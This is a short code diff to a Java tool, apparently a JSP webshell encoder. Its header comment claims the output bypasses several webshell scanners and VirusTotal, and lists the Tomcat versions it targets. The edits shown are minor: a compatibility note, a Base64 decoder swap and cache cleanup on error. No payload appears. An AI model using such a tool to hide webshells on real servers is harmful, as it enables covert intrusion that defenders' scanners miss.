@@ -30,7 +30,7 @@ public class JspEncodeDemo2 {
                 " * By: XG小刚\n" +
                 " * Time: 2023-11-04_jspdemo2\n" +
                 " * Bypass: 河马在线、河马本地(1.8.2)、D盾(2.1.7)、WEBDIR+、微步(安全)、VT(0红)、\n" +
-                " * 适配：tomcat8.5.x、tomcat9.0.x\n" +
+                " * 适配: tomcat8.x、tomcat9.0.x、tomcat10.x\n" +
                 " * java8 <= java版本 <= java21\n" +
                 " */";
     }
@@ -45,10 +45,10 @@ public class JspEncodeDemo2 {
                 }
 
                 String filename = this.key+".jsp";
-                File file1 = new File("./cache/");
-                file1.mkdir();
+                File file = new File("./cache/");
+                file.mkdir();
                 FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
-                this.sourcecode = this.sourcecode.replace("new sun.misc.BASE64Decoder().decodeBuffer","Base64.getDecoder().decode");
+                this.sourcecode = this.sourcecode.replace("new sun.misc.BASE64Decoder().decodeBuffer","java.util.Base64.getDecoder().decode");
                 fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));
 
                 JspC jspc = new JspC();
@@ -85,6 +85,7 @@ public class JspEncodeDemo2 {
 
                 return new String[]{this.encode,""};
             }catch (Exception e){
+                deleteDir("./cache/");
                 return new String[]{"加密失败",""};
             }
         }else {
